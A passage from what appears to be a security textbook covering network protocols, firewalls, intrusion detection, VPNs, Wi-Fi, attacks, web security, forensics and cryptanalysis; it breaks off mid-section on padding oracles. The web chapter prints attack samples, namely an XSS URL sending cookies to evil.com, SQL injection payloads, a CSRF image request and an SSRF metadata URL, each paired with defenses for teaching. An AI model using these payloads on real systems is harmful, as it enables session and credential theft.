| 3 | 0 | Destination Network Unreachable |
| 3 | 1 | Destination Host Unreachable |
| 3 | 3 | Destination Port Unreachable |
| 8 | 0 | Echo Request (ping) |
| 11 | 0 | TTL Exceeded in Transit |

**ping**: Sends ICMP Echo Requests, measures round-trip time
**traceroute**: Sends packets with TTL=1, 2, 3... Each router that decrements TTL to 0 sends back ICMP TTL Exceeded, revealing its IP and RTT.

---

# Chapter 21: TCP, UDP & Transport Layer

## 21.1 TCP — Transmission Control Protocol

TCP provides **reliable, ordered, error-checked** delivery of data between applications.

### TCP Header

```
Source Port (16) | Destination Port (16)
Sequence Number (32)
Acknowledgment Number (32)
Data Offset(4)|Rsv|Flags(9)| Window Size (16)
Checksum (16) | Urgent Pointer (16)
Options...
```

**Flags:** SYN, ACK, FIN, RST, PSH, URG, ECE, CWR

### Three-Way Handshake

```
Client                              Server
  │                                    │
  ├──── SYN (seq=x) ─────────────────→│
  │                                    │
  │←── SYN-ACK (seq=y, ack=x+1) ──────┤
  │                                    │
  ├──── ACK (ack=y+1) ───────────────→│
  │                                    │
  │     Connection ESTABLISHED         │
```

### Reliable Delivery

- **Sequence numbers**: Every byte has a sequence number
- **Acknowledgments**: Receiver ACKs bytes received
- **Retransmission**: Unacknowledged segments are retransmitted after timeout
- **Sliding window**: Multiple segments can be outstanding before requiring ACK

### Flow Control and Congestion Control

**Flow Control** (end-to-end): Receiver advertises window size — how many bytes it can accept.

**Congestion Control** (network-wide):
- **Slow Start**: Begin with small window (1 MSS), double each RTT until threshold
- **Congestion Avoidance**: Increase by 1 MSS per RTT (additive increase)
- **Fast Retransmit**: 3 duplicate ACKs → retransmit without waiting for timeout
- **TCP CUBIC / BBR**: Modern congestion control algorithms

### Connection Termination (Four-Way)

```
Client                              Server
  ├──── FIN ──────────────────────→ │
  │ ←── ACK ──────────────────────  │
  │ ←── FIN ──────────────────────  │
  ├──── ACK ──────────────────────→ │
  TIME_WAIT (2×MSL seconds)
```

## 21.2 UDP — User Datagram Protocol

UDP is **connectionless**: send datagrams with minimal overhead. No handshake, no guaranteed delivery, no ordering.

```
Source Port (16) | Destination Port (16)
Length (16)      | Checksum (16)
Data...
```

**Use cases:** DNS, DHCP, VoIP, video streaming, gaming, QUIC

**Why UDP when reliability is needed?** Applications implement their own reliability (QUIC, WebRTC, game engines) with better control over timing and head-of-line blocking.

## 21.3 Port Numbers

Port numbers (16-bit: 0-65535) identify applications on a host:

**Well-known ports (0-1023):**
| Port | Protocol | Service |
|------|----------|---------|
| 20/21 | TCP | FTP data/control |
| 22 | TCP | SSH |
| 23 | TCP | Telnet (insecure) |
| 25 | TCP | SMTP |
| 53 | TCP/UDP | DNS |
| 67/68 | UDP | DHCP server/client |
| 80 | TCP | HTTP |
| 110 | TCP | POP3 |
| 143 | TCP | IMAP |
| 443 | TCP | HTTPS |
| 465/587 | TCP | SMTPS/Submission |
| 993 | TCP | IMAPS |
| 3306 | TCP | MySQL |
| 5432 | TCP | PostgreSQL |

---

# Chapter 22: DNS, HTTP & Application Protocols

## 22.1 DNS — Domain Name System

DNS is the internet's phone book — translating human-readable names to IP addresses.

### DNS Hierarchy

```
                   Root (.)
                  /        \
               .com         .org
              /    \           \
          google   amazon    example
          /    \
        www    mail
```

**DNS Record Types:**

| Type | Purpose | Example |
|------|---------|---------|
| A | IPv4 address | example.com → 93.184.216.34 |
| AAAA | IPv6 address | example.com → 2606:2800:220:1:248:1893:25c8:1946 |
| CNAME | Canonical name (alias) | www → example.com |
| MX | Mail server | example.com → mail.example.com |
| TXT | Text (SPF, DKIM, verification) | "v=spf1 include:gmail.com ~all" |
| NS | Nameserver | example.com → ns1.example.com |
| SOA | Start of Authority | zone metadata |
| PTR | Reverse DNS | 34.216.184.93.in-addr.arpa → example.com |
| SRV | Service location | _http._tcp → server:port |
| CAA | Certificate Authority Authorization | "0 issue letsencrypt.org" |

### DNS Resolution Process

```
Browser queries:  www.example.com?
1. Check OS cache / hosts file
2. Ask Recursive Resolver (ISP or 8.8.8.8)
3. Recursive Resolver asks Root Server: "who handles .com?"
4. Root Server: "ask .com TLD server at 192.5.6.30"
5. Recursive Resolver asks .com TLD: "who handles example.com?"
6. TLD Server: "ask authoritative NS: ns1.example.com at 205.251.196.1"
7. Recursive Resolver asks authoritative NS: "what is www.example.com?"
8. Authoritative NS: "93.184.216.34, TTL 3600"
9. Recursive Resolver caches result, returns to browser
```

### DNS Security Issues

**DNS Cache Poisoning (Kaminsky Attack, 2008):** Attacker floods recursive resolver with forged responses before the real response arrives, poisoning the cache. Mitigation: DNSSEC, source port randomization.

**DNSSEC:** DNS Security Extensions add digital signatures to DNS records, preventing tampering. Not widely deployed for validation.

**DNS over HTTPS (DoH) / DNS over TLS (DoT):** Encrypt DNS traffic, preventing eavesdropping and ISP tracking.

## 22.2 HTTP and HTTPS

### HTTP Request/Response

**Request:**
```
GET /page.html HTTP/1.1
Host: www.example.com
User-Agent: Mozilla/5.0 (...)
Accept: text/html, */*
Cookie: session=abc123
Connection: keep-alive
```

**Response:**
```
HTTP/1.1 200 OK
Date: Mon, 1 Jan 2024 12:00:00 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 1234
Cache-Control: max-age=3600
Set-Cookie: session=xyz789; HttpOnly; Secure; SameSite=Lax
Strict-Transport-Security: max-age=31536000; includeSubDomains

<!DOCTYPE html>...
```

### HTTP Methods

| Method | Meaning | Idempotent | Safe |
|--------|---------|-----------|------|
| GET | Retrieve resource | ✅ | ✅ |
| POST | Create resource | ❌ | ❌ |
| PUT | Replace resource | ✅ | ❌ |
| PATCH | Partial update | ❌ | ❌ |
| DELETE | Delete resource | ✅ | ❌ |
| HEAD | GET without body | ✅ | ✅ |
| OPTIONS | List allowed methods | ✅ | ✅ |

### Security-Relevant HTTP Headers

| Header | Purpose |
|--------|---------|
| `Strict-Transport-Security` | Force HTTPS, prevent downgrade |
| `Content-Security-Policy` | Restrict script sources, prevent XSS |
| `X-Frame-Options` | Prevent clickjacking |
| `X-Content-Type-Options: nosniff` | Prevent MIME sniffing |
| `Referrer-Policy` | Control referrer information leakage |
| `Permissions-Policy` | Restrict browser features (camera, mic) |
| `Set-Cookie: HttpOnly; Secure; SameSite` | Cookie security flags |

---

# Chapter 23: Routing & BGP

## 23.1 Routing Fundamentals

A **router** forwards packets between networks based on routing tables:

```
$ ip route
default via 192.168.1.1 dev eth0
10.0.0.0/8 via 10.1.1.1 dev eth1
192.168.1.0/24 dev eth0
```

**Longest Prefix Match:** Router selects the most specific (longest) matching route for a destination.

## 23.2 Interior Routing Protocols

**OSPF (Open Shortest Path First):**
- Link-state protocol
- Each router knows the complete topology
- Dijkstra's algorithm finds shortest paths
- Fast convergence, scalable within an Autonomous System (AS)

**EIGRP (Enhanced Interior Gateway Routing Protocol):**
- Cisco proprietary, distance-vector hybrid
- DUAL algorithm for loop-free paths

## 23.3 BGP — Border Gateway Protocol

BGP is the routing protocol of the internet — it connects Autonomous Systems (AS) (ISPs, corporations, data centers).

**Path attributes:** BGP selects routes based on attributes like AS_PATH, LOCAL_PREF, MED.

**BGP Hijacking:** A malicious or misconfigured AS announces routes for IP prefixes it doesn't own, attracting and potentially disrupting traffic. Famous incidents: Pakistan Telecom hijacking YouTube (2008), China Telecom re-routing traffic (2010).

**Mitigation (RPKI — Resource Public Key Infrastructure):** Cryptographically signs BGP route origins, allowing ISPs to validate that an AS is authorized to announce a prefix.

---

# PART VI — NETWORK SECURITY

---

# Chapter 24: Firewalls & Packet Filtering

## 24.1 What Is a Firewall?

A **firewall** enforces access control policy at a network boundary — deciding which traffic to allow and which to block based on defined rules.

```
Internet ← → [Firewall] ← → Internal Network
```

## 24.2 Types of Firewalls

### Packet Filter (Stateless)

Examines each packet independently against rules:

```
iptables rules example:
-A INPUT -p tcp --dport 22 -s 192.168.1.0/24 -j ACCEPT   # Allow SSH from LAN
-A INPUT -p tcp --dport 80 -j ACCEPT                     # Allow HTTP from anywhere
-A INPUT -p tcp --dport 443 -j ACCEPT                    # Allow HTTPS from anywhere
-A INPUT -j DROP                                          # Default deny
```

**Stateless limitation:** Cannot correlate packets to connections. Returning traffic must be explicitly allowed — which often means allowing all high-numbered ports.

### Stateful Firewall

Tracks TCP/UDP **connection state** in a connection table:

```
Connection Table:
SRC_IP:PORT    DST_IP:PORT    PROTO  STATE
10.0.0.5:54321 8.8.8.8:80    TCP    ESTABLISHED
10.0.0.6:54322 8.8.8.8:443   TCP    ESTABLISHED
```

**Rule:** Allow OUTBOUND connections initiated from the inside. Allow RETURN traffic for established connections. Drop all unsolicited INBOUND connections.

Stateful firewalls automatically allow return traffic — no need for explicit rules on high ports.

### Application-Layer Firewall (Layer 7)

Deep Packet Inspection (DPI) understands application protocols:
- Detect SQL injection in HTTP requests
- Block specific domains in DNS queries
- Inspect TLS SNI for blocked domains
- Protocol anomaly detection (e.g., non-HTTP traffic on port 80)

### Next-Generation Firewall (NGFW)

Combines stateful + DPI + IDS/IPS + user identity + application awareness + SSL inspection.

## 24.3 Firewall Zones and DMZ

```
Internet
   │
[Edge Firewall]
   │         │
  DMZ      Internal Network
  │ │
  │ └── Web Server (publicly accessible)
  └──── Mail Server (publicly accessible)
        
  [Internal Firewall]
       │
  Internal Hosts / Databases
```

**DMZ (Demilitarized Zone):** A network segment between the internet and internal network hosting publicly accessible servers. Traffic rules: Internet→DMZ allowed; DMZ→Internal restricted; Internet→Internal blocked.

## 24.4 WAF — Web Application Firewall

A WAF sits in front of web applications and filters HTTP/HTTPS traffic:

**Detects and blocks:**
- SQL injection
- XSS (Cross-Site Scripting)
- Path traversal
- Remote file inclusion
- HTTP request smuggling
- Layer 7 DDoS

**OWASP ModSecurity Core Rule Set (CRS)** is the standard open-source WAF ruleset.

---

# Chapter 25: Intrusion Detection & Prevention

## 25.1 IDS vs IPS

| Feature | IDS (Intrusion Detection System) | IPS (Intrusion Prevention System) |
|---------|----------------------------------|-----------------------------------|
| Position | Out-of-band (passive tap) | Inline (in traffic path) |
| Action | Alert only | Alert + block |
| Risk | No false-positive impact | False positives block legitimate traffic |
| Use case | Monitoring, forensics | Active defense |

## 25.2 Detection Methods

### Signature-Based Detection

Match traffic against known attack patterns:
```
Snort Rule Example:
alert tcp $EXTERNAL_NET any -> $HTTP_SERVERS $HTTP_PORTS \
  (msg:"SQL Injection attempt"; \
   content:"union select"; nocase; \
   pcre:"/union[\s]+select/i"; \
   classtype:web-application-attack; sid:1001; rev:1;)
```

**Pros:** Low false positives on known attacks, fast
**Cons:** Cannot detect 0-days, signatures must be updated constantly

### Anomaly-Based Detection

Build a baseline of normal behavior; alert on deviations:
- Statistical: flag traffic that's more than 3σ from mean
- Machine learning: train on normal traffic, alert on anomalies
- Protocol anomaly: RFC-compliant vs non-compliant packets

**Pros:** Can detect unknown attacks
**Cons:** High false positive rate, baseline drift

### Behavioral Analysis (UEBA)

User and Entity Behavior Analytics — detect anomalous user behavior:
- User logging in from a new country at 3am
- Sudden large data download after years of normal usage
- Privilege escalation attempts

## 25.3 SIEM — Security Information & Event Management

A SIEM aggregates logs from across the network and correlates events to detect attacks:

```
Endpoints → [Log Shippers] → [SIEM]
Firewalls → [Log Shippers] → [SIEM] → Alerts → SOC
IDS/IPS  → [Log Shippers] → [SIEM]
Auth systems →              [SIEM]
```

**Key capabilities:**
- Real-time correlation across sources
- Historical search and investigation
- Compliance reporting (PCI-DSS, HIPAA, SOC2)
- Threat hunting

**Commercial:** Splunk, IBM QRadar, Microsoft Sentinel
**Open-source:** Wazuh, OpenSearch (ELK stack), OSSIM

---

# Chapter 26: VPNs & Tunneling

## 26.1 VPN Fundamentals

A **Virtual Private Network (VPN)** creates an encrypted tunnel over an untrusted network (the internet), making the remote endpoint appear locally connected.

**Use cases:**
- Remote access: employees connecting to corporate network
- Site-to-site: connecting branch offices
- Privacy: hiding traffic from ISP/surveillance
- Bypassing geo-restrictions

## 26.2 IPSec

IPSec operates at Layer 3 (IP), providing:
- **Authentication Header (AH)**: Integrity and authentication, no encryption
- **Encapsulating Security Payload (ESP)**: Encryption + optional authentication

**Modes:**
- **Transport mode**: Encrypts only the IP payload; original IP header preserved. Host-to-host.
- **Tunnel mode**: Encrypts the entire IP packet + adds new IP header. Gateway-to-gateway.

**IKE (Internet Key Exchange):**
- **IKEv2** (current standard): Two-phase key negotiation
  - Phase 1: Establish secure channel (DH + auth)
  - Phase 2: Negotiate Security Associations (SAs) for data

**IPSec algorithms (modern, RFC 8221):**
- Encryption: AES-GCM-128, AES-GCM-256, ChaCha20-Poly1305
- PRF: HMAC-SHA256, HMAC-SHA384
- DH: Groups 19 (P-256), 20 (P-384), 31 (Curve25519)

## 26.3 OpenVPN

OpenVPN uses TLS for the control channel and custom UDP/TCP protocol for data. Very flexible but complex.

## 26.4 WireGuard

WireGuard (2020) is a modern, minimal VPN:
- **Cryptographically opinionated**: No cipher agility — uses Curve25519, ChaCha20-Poly1305, BLAKE2s, HKDF, SipHash24
- **Only ~4,000 lines of code** (vs OpenVPN's ~100,000)
- Roaming: endpoint IP changes transparently (great for mobile)
- No connection state — peers are authenticated by public key

```ini
# WireGuard config example
[Interface]
PrivateKey = <server private key>
Address = 10.0.0.1/24
ListenPort = 51820

[Peer]
PublicKey = <client public key>
AllowedIPs = 10.0.0.2/32
```

WireGuard is now built into the Linux kernel (5.6+). Used as the foundation for Tailscale, Cloudflare WARP, and many commercial VPNs.

---

# Chapter 27: Wireless Security (Wi-Fi, WPA3, Bluetooth)

## 27.1 Wi-Fi Security Standards

| Protocol | Year | Status | Weaknesses |
|----------|------|--------|-----------|
| WEP | 1997 | **Broken** | RC4 key reuse, 24-bit IV |
| WPA | 2003 | **Broken** | TKIP RC4 |
| WPA2-Personal | 2004 | Acceptable | PMKID attack, dictionary attacks |
| WPA2-Enterprise | 2004 | Secure | Proper use required |
| WPA3-Personal | 2018 | Recommended | SAE (Dragonfly) |
| WPA3-Enterprise | 2018 | Recommended | 192-bit mode |

### WEP — Why It Failed

WEP used RC4 with a 24-bit IV prepended to the key. With 2^24 = 16 million possible IVs, after ~40,000 packets, IV reuse allows statistical recovery of the key. WEP networks can be cracked in minutes with `aircrack-ng`.

### WPA2 — KRACK Attack

**KRACK (Key Reinstallation Attack, 2017):** By replaying or retransmitting handshake messages, an attacker can force nonce reuse in TKIP/CCMP, breaking encryption. Fixed by OS patches.

**PMKID Attack:** Capture a single packet from a WPA2 network (no 4-way handshake capture needed), attempt offline dictionary attack on the PMK (Pre-Shared Key). Fast with GPU and large wordlists.

### WPA3 — Improvements

WPA3-Personal replaces the PSK (Pre-Shared Key) handshake with **SAE (Simultaneous Authentication of Equals / Dragonfly):**
- Mutual authentication based on Diffie-Hellman
- Forward secrecy: each session has unique session key
- Offline dictionary attacks are infeasible (must interact with AP for each guess)

WPA3-Enterprise (192-bit mode):
- Mandatory GCMP-256 encryption
- HMAC-SHA-384 authentication
- ECDH/ECDSA with P-384

## 27.2 802.1X / EAP — Enterprise Wi-Fi Authentication

Enterprise Wi-Fi uses the **802.1X** framework:

```
Supplicant       Authenticator         RADIUS Server
(client)         (access point)        (corp network)
    │                    │                    │
    ├── EAP-Start ───→   │                    │
    │← EAP-Request(id) ──┤                    │
    ├── EAP-Response ──→ ├────── RADIUS ────→ │
    │                    │                    │ Verify
    │                    │ ←── Accept ──────  │
    │← EAP-Success ──────┤                    │
    │  Install keys                           │
```

**EAP Methods:**
- **EAP-TLS**: Client and server both present certificates — most secure
- **PEAP**: Only server cert required; client authenticates with password inside TLS tunnel
- **EAP-TTLS**: Similar to PEAP, more flexible

## 27.3 Bluetooth Security

Bluetooth security modes and their vulnerabilities:

**Classic Bluetooth attacks:**
- **BlueSnarfing**: Unauthorized access to device data
- **BlueBugging**: Remote control of device
- **KNOB (Key Negotiation of Bluetooth)**: Forces short encryption key (1 byte), enables brute force

**Bluetooth Low Energy (BLE) security:**
- Pairing modes: Just Works (no auth), Passkey, OOB, Numeric Comparison
- Encryption: AES-CCM-128
- Privacy: Resolvable Private Addresses (RPA) prevent tracking

---

# Chapter 28: Network Attack Techniques

## 28.1 Reconnaissance

### Passive Reconnaissance
- OSINT: Shodan, LinkedIn, WHOIS, Certificate Transparency logs
- DNS enumeration: `dig`, zone transfers, subdomain brute-forcing
- Google dorking: `site:example.com filetype:pdf`, `inurl:admin`

### Active Reconnaissance
- Port scanning (nmap): `nmap -sS -sV -O -p 1-65535 target`
- Service fingerprinting: banner grabbing, version detection
- OS fingerprinting: TTL values, TCP window sizes, IP options

**nmap scan types:**
| Flag | Type | Notes |
|------|------|-------|
| -sS | SYN scan | Stealth, doesn't complete handshake |
| -sT | Connect scan | Full handshake, logged |
| -sU | UDP scan | Slow, unreliable |
| -sN | NULL scan | No flags set |
| -sF | FIN scan | FIN flag only |
| -sX | XMAS scan | FIN+PSH+URG flags |

## 28.2 Man-in-the-Middle Attacks

An attacker positions themselves between two parties:

### ARP Poisoning (Layer 2 MITM)
```
Normal:   Alice → Switch → Bob
MITM:     Alice → [Attacker] → Bob

Attacker sends:
  "192.168.1.20 is at ATTACKER_MAC" (to Alice's ARP cache)
  "192.168.1.10 is at ATTACKER_MAC" (to Bob's ARP cache)
```

Tools: `arpspoof`, `ettercap`, `Bettercap`

### SSL Stripping
Downgrades HTTPS to HTTP by intercepting redirects:
1. Client sends `http://bank.com`
2. Attacker intercepts, fetches `https://bank.com` themselves
3. Attacker serves `http://bank.com` to victim (unencrypted!)
4. Victim is unaware — they never see the padlock

**Defense:** HTTP Strict Transport Security (HSTS)

## 28.3 Denial of Service (DoS) and DDoS

**Volumetric attacks:** Overwhelm bandwidth
- UDP flood: Send massive amounts of UDP packets
- DNS amplification: Send small query, get large response (amplification factor up to 70×)
- NTP amplification: monlist command returns up to 600 records (amplification 556×)

**Protocol attacks:** Exploit protocol weaknesses
- SYN flood: Send many SYN packets, exhaust server's connection table
- Ping of Death: Oversized fragmented ICMP packets
- Smurf: ICMP Echo to broadcast address with spoofed source

**Application layer (Layer 7):**
- HTTP flood: Legitimate-looking requests exhaust server resources
- Slowloris: Open many connections, send incomplete headers — holds server connections open

**Defense:**
- Anycast routing + scrubbing centers (Cloudflare, Akamai)
- Rate limiting (at multiple layers)
- SYN cookies (stateless SYN flood defense)
- BGP blackholing

## 28.4 Port Scanning and Firewall Evasion

Common evasion techniques:
- **Fragmentation**: Split packets to evade pattern matching
- **Timing**: Very slow scans to avoid threshold-based detection
- **Decoys**: `-D` in nmap spoofs source IPs (real scan still included)
- **Source port manipulation**: Use common ports (80, 443) as source
- **IPv6**: Many firewalls still have weaker IPv6 rules

---

# Chapter 29: Web Application Security

## 29.1 OWASP Top 10

The OWASP Top 10 (2021) lists the most critical web application security risks:

1. **A01: Broken Access Control** — Most common; users access unauthorized resources
2. **A02: Cryptographic Failures** — Weak encryption, cleartext transmission
3. **A03: Injection** — SQL, LDAP, OS command injection
4. **A04: Insecure Design** — Missing threat modeling, missing security controls by design
5. **A05: Security Misconfiguration** — Default credentials, unnecessary features enabled
6. **A06: Vulnerable and Outdated Components** — Unpatched libraries and frameworks
7. **A07: Identification and Authentication Failures** — Weak passwords, no MFA
8. **A08: Software and Data Integrity Failures** — Unsigned updates, insecure deserialization
9. **A09: Security Logging and Monitoring Failures** — Not detecting breaches
10. **A10: Server-Side Request Forgery (SSRF)** — Making server fetch internal resources

## 29.2 SQL Injection

SQL injection is the most devastating web attack when successful.

**Vulnerable code:**
```java
// NEVER DO THIS — vulnerable to SQL injection:
String query = "SELECT * FROM users WHERE username='" + username
             + "' AND password='" + password + "'";
Statement stmt = conn.createStatement();
ResultSet rs = stmt.executeQuery(query); // DANGEROUS
```

**Attack payload:** `username = admin' OR '1'='1' --`

```sql
SELECT * FROM users WHERE username='admin' OR '1'='1' --' AND password='...'
-- The -- comments out the password check. This returns all users or logs in as admin.
```

**Blind SQL injection:** When no error is returned, extract data character-by-character:
```sql
' AND SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='a' --
-- If the response is different when true vs false, enumerate character by character
```

**Defenses:**
```java
// ALWAYS use PreparedStatement (parameterized queries):
String sql = "SELECT * FROM users WHERE username = ? AND password = ?";
PreparedStatement ps = conn.prepareStatement(sql);
ps.setString(1, username);
ps.setString(2, password);
ResultSet rs = ps.executeQuery(); // Safe — parameters never interpreted as SQL

// OR use an ORM (Hibernate / JPA):
TypedQuery<User> q = em.createQuery(
    "SELECT u FROM User u WHERE u.username = :uname AND u.password = :pwd", User.class);
q.setParameter("uname", username);
q.setParameter("pwd",   password);
User user = q.getSingleResult();

// Additional layers:
// - Input validation (whitelist with regex / Bean Validation @Pattern)
// - Least privilege DB user (SELECT-only where possible, separate write user)
// - WAF rules (ModSecurity CRS)
// - Never expose stack traces in HTTP responses (use @ControllerAdvice in Spring)
```

## 29.3 Cross-Site Scripting (XSS)

XSS injects malicious scripts into web pages viewed by other users.

**Reflected XSS:**
```
URL: https://bank.com/search?q=<script>document.location='https://evil.com/steal?c='+document.cookie</script>
```
If the server reflects the parameter unsanitized, the browser executes it.

**Stored XSS:**
Malicious script stored in the database (e.g., in a comment), executed every time the page loads.

**DOM-based XSS:**
Client-side JavaScript reads URL parameters and inserts them into the DOM without sanitization.

**Impact:** Session theft, credential phishing, keylogging, malware distribution.

**Defenses:**
```java
// HTML encode all output — using OWASP Java Encoder library (recommended)
// Maven: org.owasp.encoder:encoder:1.2.3
import org.owasp.encoder.Encode;

String safeOutput = Encode.forHtml(userInput);           // for HTML body content
String safeAttr   = Encode.forHtmlAttribute(userInput);  // inside HTML attributes
String safeJs     = Encode.forJavaScript(userInput);     // inside <script> blocks
String safeUrl    = Encode.forUriComponent(userInput);   // in URL parameters

// OR using Spring's HtmlUtils (simpler, less complete):
String safe = org.springframework.web.util.HtmlUtils.htmlEscape(userInput);

// Content Security Policy header (set in HTTP response or Spring Security config):
// response.setHeader("Content-Security-Policy",
//     "default-src 'self'; script-src 'self' https://cdn.example.com");

// Cookie flags (Spring Security — recommended):
// http.sessionManagement().sessionCreationPolicy(...)
// Cookie set with: HttpOnly=true, Secure=true, SameSite=Strict
// In Spring Boot application.properties:
//   server.servlet.session.cookie.http-only=true
//   server.servlet.session.cookie.secure=true
//   server.servlet.session.cookie.same-site=strict
```

## 29.4 CSRF — Cross-Site Request Forgery

A malicious page tricks the victim's browser into making authenticated requests to another site.

**Example:**
```html
<!-- On evil.com -->
<img src="https://bank.com/transfer?to=attacker&amount=1000" style="display:none">
<!-- The victim's browser sends this request with their bank session cookie -->
```

**Defenses:**
- **CSRF tokens**: Include unpredictable token in forms, verify server-side
- **SameSite cookies**: `SameSite=Lax` or `SameSite=Strict` prevents cross-site requests from including cookies
- **Double Submit Cookie**: Include CSRF token in both cookie and form field
- **Custom request headers**: AJAX with custom headers triggers CORS preflight

## 29.5 Authentication Attacks

### Brute Force
- Rate limiting: lock after N failed attempts
- CAPTCHA
- Progressive delays (exponential backoff)

### Credential Stuffing
- Use breached username/password lists from other sites
- Defense: MFA, breach credential checking (Have I Been Pwned? API)

### Password Spraying
- Try one common password against many usernames
- Avoids lockout thresholds
- Defense: Unusual hours detection, MFA, Azure Smart Lockout

## 29.6 Server-Side Request Forgery (SSRF)

SSRF tricks a server into making HTTP requests to internal resources:

```
Vulnerable endpoint: https://api.example.com/fetch?url=...
Attack:             https://api.example.com/fetch?url=http://169.254.169.254/latest/meta-data/
                    (AWS metadata service — returns IAM credentials!)
```

**Defense:**
- Validate and whitelist allowed URLs
- Resolve hostname to IP, check against blocklist (private IP ranges, localhost)
- Use dedicated egress proxy with allowlist

---

# Chapter 30: Incident Response & Forensics

## 30.1 Incident Response Lifecycle (NIST SP 800-61)

```
┌──────────────────────────────────────────────────────────┐
│               Incident Response Lifecycle                 │
│                                                          │
│  ┌───────────┐    ┌────────────┐    ┌─────────────────┐  │
│  │Preparation│→→→ │ Detection & │→→→ │  Containment,  │  │
│  │           │    │  Analysis  │    │  Eradication &  │  │
│  │           │←←← │            │    │    Recovery     │  │
│  └───────────┘    └────────────┘    └────────┬────────┘  │
│         ↑                                    │           │
│         └──────── Post-Incident Activity ←───┘           │
└──────────────────────────────────────────────────────────┘
```

### Phase 1: Preparation
- Incident response plan (IRP) documented
- SIEM and logging configured
- IR team trained and on-call
- Contact lists (legal, PR, law enforcement)
- Forensic tools ready
- Out-of-band communication channel

### Phase 2: Detection & Analysis
- Initial triage: Is this an incident? What's the scope?
- Identify indicators of compromise (IoCs)
- Determine attack vector, affected systems
- Classify severity (P1 = critical, P4 = low)

**IoC Types:**
- Atomic: IP addresses, domain names, file hashes
- Computed: regex patterns, YARA rules
- Behavioral: Sigma rules, TTPs from MITRE ATT&CK

### Phase 3: Containment
**Short-term containment:** Stop the bleeding — isolate affected systems, change credentials, block attacker IPs.

**Long-term containment:** Deploy fixes while keeping systems running for business continuity.

**Evidence preservation:** Before wiping/rebuilding, capture:
- Memory dump (volatile)
- Disk image (non-volatile)
- Network captures
- Log files

### Phase 4: Eradication
- Remove malware and backdoors
- Patch vulnerabilities exploited
- Reset all possibly-compromised credentials
- Review for persistence mechanisms (scheduled tasks, registry run keys, cron jobs, startup items)

### Phase 5: Recovery
- Restore from clean backups
- Verify system integrity (file hash comparison)
- Increased monitoring for recurrence
- Gradual return to production

### Phase 6: Post-Incident (Lessons Learned)
- What happened? When? How?
- How was it detected?
- What worked? What didn't?
- What improvements are needed?
- Update playbooks and defenses

## 30.2 Digital Forensics

### Forensic Principles
- **Chain of custody**: Document every person who touches evidence
- **Write blockers**: Prevent modification of evidence drives
- **Hash verification**: MD5/SHA-256 hash of evidence before and after — prove it wasn't tampered
- **Documentation**: Everything must be documented, reproducible

### Memory Forensics

Memory contains: running processes, network connections, encryption keys, passwords, registry hives.

```bash
# Capture memory:
winpmem_mini.exe output.raw

# Analyze with Volatility:
volatility -f memory.raw --profile=Win10x64 pslist
volatility -f memory.raw --profile=Win10x64 netscan
volatility -f memory.raw --profile=Win10x64 malfind
```

### Disk Forensics

```bash
# Create forensic image:
dc3dd if=/dev/sda of=evidence.img hash=sha256 log=hashes.txt

# Mount read-only:
mount -o ro,loop evidence.img /mnt/evidence

# Analyze with Autopsy or The Sleuth Kit
```

**Key artifacts:**
- Windows: Registry (NTUSER.DAT, SYSTEM, SAM, SECURITY, SOFTWARE), Prefetch files, Event logs, LNK files, Browser history, MFT ($MFT), Shadow copies
- Linux: /var/log/, .bash_history, /etc/passwd, cron, systemd journal, /tmp

### Network Forensics

```bash
# Capture:
tcpdump -i eth0 -w capture.pcap

# Analyze:
wireshark capture.pcap
tshark -r capture.pcap -T fields -e ip.src -e ip.dst -e tcp.dstport

# Extract files from capture:
foremost -i capture.pcap -o output/
```

## 30.3 MITRE ATT&CK Framework

ATT&CK is a knowledge base of adversary tactics, techniques, and procedures (TTPs) based on real-world observations.

**Tactics (the "why"):**
```
1. Reconnaissance
2. Resource Development
3. Initial Access
4. Execution
5. Persistence
6. Privilege Escalation
7. Defense Evasion
8. Credential Access
9. Discovery
10. Lateral Movement
11. Collection
12. Command and Control (C2)
13. Exfiltration
14. Impact
```

**Use cases:**
- Red team planning: Use ATT&CK to plan realistic attack simulations
- Detection engineering: Map SIEM rules to ATT&CK techniques
- Gap analysis: What techniques can't you currently detect?
- Threat intelligence: Track which APT groups use which techniques

---

---

# PART VII — ADVANCED TOPICS

---

# Chapter 31: Cryptanalysis — Breaking Ciphers

## 31.1 Attack Models

Cryptanalysis uses these attack models (in increasing power):

| Model | What Attacker Has |
|-------|------------------|
| Ciphertext-only | Ciphertext only |
| Known-plaintext | Some (plaintext, ciphertext) pairs |
| Chosen-plaintext (CPA) | Can encrypt chosen messages |
| Chosen-ciphertext (CCA) | Can decrypt chosen ciphertexts (except target) |
| Related-key | Access to encryptions under related keys |

A cipher secure against CCA is secure against all weaker models.

## 31.2 Differential Cryptanalysis

Differential cryptanalysis (Biham & Shamir, 1990) analyzes how **differences** between pairs of plaintexts propagate through the cipher to differences in ciphertexts.

**Fundamental idea:**
```
P₁ and P₂ = P₁ ⊕ ΔP  (a pair with a chosen XOR difference ΔP)

After encryption:
C₁ and C₂ = C₁ ⊕ ΔC  (the resulting output difference)

High-probability differential:  ΔP → ΔC occurs with probability p
If p >> 2^(-n), the cipher is vulnerable
```

**Application to DES:**
- Choose ΔP with specific difference known to propagate with high probability
- Collect many (P₁, P₂, C₁, C₂) pairs
- The correct key guess is consistent with more pairs than wrong guesses

DES was actually designed to resist differential cryptanalysis (IBM/NSA knew about it in 1974) — but the attack was published publicly in 1990.

## 31.3 Linear Cryptanalysis

Linear cryptanalysis (Matsui, 1993) finds **linear approximations** of the cipher — relationships of the form:

```
P[a] ⊕ C[b] = K[c]   holds with probability 1/2 + ε
```

Where P[a] = XOR of certain plaintext bits, C[b] = XOR of certain ciphertext bits, K[c] = XOR of certain key bits.

If ε is large enough and enough known plaintexts are available:
```
Advantage ≈ ε² × N   (N = number of known plaintexts)
```

**Full DES broken** with 2^43 known plaintexts via linear cryptanalysis.

## 31.4 The Wide-Trail Strategy

AES was designed using the **wide-trail strategy** to quantitatively bound differential and linear attacks:

- Minimum number of active S-boxes in any differential/linear trail: 25 (for 4 rounds)
- S-box differential uniformity: 4 (maximum probability per output bit: 4/256)
- Probability of best 4-round trail: (4/256)^25 ≈ 2^(-150) — far below 2^(-128)

This provides a **provable lower bound** on attack difficulty.

## 31.5 Padding Oracle Attacks

When a decryption oracle reveals whether decrypted padding is valid (or gives a timing difference), an attacker can decrypt ciphertexts without knowing the key.

**PKCS#7 padding in CBC:**
```
Block N-1: IV for block N
Block N:   ... | pad | pad | pad | (e.g., 03 03 03 for 3 bytes of padding)
```

**Attack principle:**
1. Modify last byte of C_{N-1}: try all 256 values
